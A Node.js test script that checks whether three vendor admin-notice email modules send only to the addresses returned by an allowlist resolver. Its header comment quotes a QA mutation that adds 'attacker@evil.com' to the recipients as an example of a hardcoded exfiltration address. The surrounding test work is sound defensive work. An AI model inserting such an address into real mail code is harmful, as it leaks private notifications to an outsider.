#!/usr/bin/env node
// G1 (vendor-flow-notifications) — A10: RECIPIENT-EXACT-MATCH, the runtime property
// check-recipients-allowlist-only.mjs (A5) cannot prove. A5 is a source-text scan: it proves a
// module IMPORTS and CALLS getVendorAdminNotifyRecipients(), and that no mailer.send `to:`
// literally references a vendor-submitted identifier. It does NOT prove the addresses actually
// handed to mailer.send are the resolver's output, unmodified.
//
// @qa demonstrated the gap directly: mutating lib/vendor-application-admin-notice.ts by adding
// `recipients.push('attacker@evil.com');` immediately after the getVendorAdminNotifyRecipients()
// call left A5/A6/A7/A8 all green, because none of them ever compares the actual `to:` set sent
// against the resolver's real output. A hardcoded exfiltration address, a silently dropped
// recipient, or a substituted address all pass under the existing checks.
//
// This check closes that gap by composing the REAL resolver with each REAL admin-notice sender,
// under a fixture mailer that records every `to:` address actually passed to mailer.send, and
// asserting the captured set is IDENTICAL — same addresses, same count, no additions, no
// omissions, no substitutions — to a fresh, independent call of the real resolver. Both sides
// are computed from the real modules; nothing here is a fixture/expected-value guess that could
// itself drift from the resolver's real behaviour.
//
// Run as: npx tsx contracts/checks/vendor-flow-notifications/check-recipients-exact-match.mjs

process.env.ADMIN_EMAIL_ALLOWLIST = 'admin-one@example.com,admin-two@example.com,admin-three@example.com';

const failures = [];

async function freshImport(relPath) {
  // Cache-busting import, same convention as check-recipients-resolver-behavior.mjs, so each
  // case re-evaluates fresh module-scope state against the env var set immediately before it.
  return import(`${relPath}?cb=${Date.now()}-${Math.random()}`);
}

function sortedCopy(arr) {
  return [...arr].sort();
}

async function proveExactMatch(label, sendFnPath, sendFnName, baseInput) {
  // Independently resolve the expected set via a fresh import of the REAL resolver — never a
  // hardcoded literal, so this check can't drift from the resolver's own parse behaviour, and
  // never the SAME import the sender module holds, so a mutation that tampers with the sender's
  // local `recipients` binding after the resolver call is still caught.
  const resolverMod = await freshImport('../../../lib/vendor-admin-notify-recipients.ts');
  const expected = resolverMod.getVendorAdminNotifyRecipients();
  if (!Array.isArray(expected) || expected.length === 0) {
    failures.push(`${label}: test setup error — expected a non-empty resolver result, got ${JSON.stringify(expected)}`);
    return;
  }

  const senderMod = await freshImport(sendFnPath);
  const sendFn = senderMod[sendFnName];
  if (typeof sendFn !== 'function') {
    failures.push(`${label}: ${sendFnName} is not exported from ${sendFnPath}`);
    return;
  }

  const capturedTo = [];
  const fixtureMailer = {
    send: async (args) => {
      capturedTo.push(args.to);
    },
  };

  await sendFn(baseInput, { mailer: fixtureMailer });

  const gotSorted = sortedCopy(capturedTo);
  const expectedSorted = sortedCopy(expected);

  if (capturedTo.length !== expected.length) {
    failures.push(
      `${label}: expected exactly ${expected.length} mailer.send call(s) (one per resolver ` +
        `recipient), got ${capturedTo.length}. Sent to: ${JSON.stringify(capturedTo)}; ` +
        `resolver returned: ${JSON.stringify(expected)}.`,
    );
    return;
  }
  if (JSON.stringify(gotSorted) !== JSON.stringify(expectedSorted)) {
    failures.push(
      `${label}: the set of addresses actually sent to does not match the resolver's output ` +
        `1:1. Sent to (sorted): ${JSON.stringify(gotSorted)}; resolver returned (sorted): ` +
        `${JSON.stringify(expectedSorted)}. Every recipient must come exclusively from ` +
        'getVendorAdminNotifyRecipients(), with no addition, omission, or substitution.',
    );
  }
}

await proveExactMatch(
  'vendor-application-admin-notice',
  '../../../lib/vendor-application-admin-notice.ts',
  'sendVendorApplicationAdminNoticeEmail',
  {
    businessName: 'Cape Orchid Traders',
    contactPersonName: 'Jane Vendor',
    applicationId: 'app-123',
    reviewUrl: 'https://saoc.co.za/admin/vendors/applications',
  },
);

await proveExactMatch(
  'vendor-submission-admin-notice',
  '../../../lib/vendor-submission-admin-notice.ts',
  'sendVendorSubmissionAdminNoticeEmail',
  {
    businessName: 'Cape Orchid Traders',
    contactPersonName: 'Jane Vendor',
    vendorSubmissionId: 'sub-123',
    reviewUrl: 'https://saoc.co.za/admin/vendors',
  },
);

await proveExactMatch(
  'vendor-payment-admin-notice',
  '../../../lib/vendor-payment-admin-notice.ts',
  'sendVendorPaymentAdminNoticeEmail',
  {
    businessName: 'Cape Orchid Traders',
    contactPersonName: 'Jane Vendor',
    standOrderRef: 'VSO-sub-123',
    reviewUrl: 'https://saoc.co.za/admin/vendors',
  },
);

if (failures.length > 0) {
  failures.forEach((f) => console.error(`FAIL: ${f}`));
  console.error(`\n${failures.length} assertion(s) failed.`);
  process.exit(1);
}

console.log(
  'PASS: all three admin-notice modules send to EXACTLY the resolver\'s output — same ' +
    'addresses, same count — with no addition, omission, or substitution.',
);
process.exit(0);
